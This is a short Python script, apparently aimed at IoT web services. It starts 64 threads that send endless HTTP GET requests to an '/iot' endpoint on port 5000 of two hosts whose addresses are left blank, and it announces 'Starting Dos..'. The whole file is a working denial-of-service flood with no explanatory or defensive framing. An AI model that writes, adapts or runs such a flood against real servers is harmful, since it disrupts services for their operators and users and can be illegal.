#!/usr/bin/python3

import threading
import requests

host1 = ''
host2 = ''
api = 'iot'


def GET1():
    while True:
        try:
            url = f'''http://{host1}:5000/{api}'''
            requests.get(url, verify=False)
        except:
            break


def GET2():
    while True:
        try:
            url = f'''http://{host2}:5000/{api}'''
            requests.get(url, verify=False)
        except:
            break


for _ in range(32):
    get1 = threading.Thread(target=GET1)
    get2 = threading.Thread(target=GET2)
    get1.start()
    get2.start()

print("Starting Dos..")
